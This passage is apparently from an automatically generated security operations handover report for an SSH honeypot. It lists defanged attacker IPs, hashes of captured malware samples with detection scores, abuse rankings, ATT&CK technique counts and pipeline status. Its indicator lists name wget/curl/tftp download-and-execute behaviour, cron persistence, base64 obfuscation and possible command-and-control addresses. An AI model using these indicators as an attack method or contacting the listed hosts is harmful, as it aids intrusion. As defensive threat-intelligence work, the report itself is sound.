| `195.184.76[.]32` | 1 | 2026-07-17 01:52 | 2026-07-17 01:52 | 3s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]36` | 1 | 2026-07-17 01:52 | 2026-07-17 01:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.212.9[.]221` | 1 | 2026-07-17 04:28 | 2026-07-17 04:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `213.66.196[.]11` | 1 | 2026-07-17 04:31 | 2026-07-17 04:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `217.211.208[.]125` | 1 | 2026-07-17 04:00 | 2026-07-17 04:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.85.102[.]135` | 1 | 2026-07-17 01:48 | 2026-07-17 01:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]147` | 1 | 2026-07-17 04:06 | 2026-07-17 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]127` | 1 | 2026-07-17 03:55 | 2026-07-17 03:55 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-07-17 01:40 | 2026-07-17 01:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-07-17 01:39 | 2026-07-17 01:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]71` | 1 | 2026-07-17 01:28 | 2026-07-17 01:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]218` | 1 | 2026-07-17 02:49 | 2026-07-17 02:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `54.146.134[.]248` | 1 | 2026-07-17 01:19 | 2026-07-17 01:19 | 2s | 0 | `T1592` | 🟢 LOW |
| `60.174.205[.]133` | 1 | 2026-07-17 04:31 | 2026-07-17 04:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]159` | 1 | 2026-07-17 04:08 | 2026-07-17 04:08 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]167` | 1 | 2026-07-17 01:17 | 2026-07-17 01:17 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-07-17 01:39 | 2026-07-17 01:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]132` | 1 | 2026-07-17 01:51 | 2026-07-17 01:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-17 02:34 | 2026-07-17 02:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-17 04:44 | 2026-07-17 04:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]8` | 1 | 2026-07-17 00:57 | 2026-07-17 00:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]182` | 1 | 2026-07-17 04:16 | 2026-07-17 04:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]198` | 1 | 2026-07-17 01:54 | 2026-07-17 01:54 | 2s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]153` | 1 | 2026-07-17 01:32 | 2026-07-17 01:32 | 2s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]154` | 1 | 2026-07-17 01:29 | 2026-07-17 01:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]205` | 1 | 2026-07-17 01:30 | 2026-07-17 01:30 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 40/100 | 🟡 MEDIUM | **25/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `183.129.52[.]189` | CN | CHINANET-ZJ Hangzhou node network | **100** ⚠️ | 0 |
| `182.75.197[.]174` | IN | Devbhumi Broadcast Pvt Ltd | **100** ⚠️ | 50 |
| `183.171.149[.]196` | MY | Celcom Axiata Berhad | **100** ⚠️ | 19 |
| `183.171.236[.]23` | MY | Celcom Axiata Berhad | **100** ⚠️ | 37 |
| `94.231.206[.]153` | SG | FR ONYPHE | **100** ⚠️ | 50 |
| `128.185.220[.]90` | IN | BHARTI-AIRTEL | **100** ⚠️ | 50 |
| `183.247.171[.]186` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `103.61.122[.]229` | VN | H2 VIET NAM TECHNOLOGY SOLUTIONS COMPANY LIMITED | **100** ⚠️ | 50 |
| `109.105.209[.]19` | US | ICG-ZEN-LAX-1 | **100** ⚠️ | 50 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 195 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 182 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 66 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 64 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 64 |

---

## 🔕 False Positive Summary (54 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 48 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 521 cases |
| Tool 34  | Credential Extractor        | ✅ 215 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 152 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 54 filtered (10.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 87 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 33 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 182 priority case(s) shown individually · 64 recon entry/entries in table (20 group(s) consolidating 241 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-17T06:21:36Z_
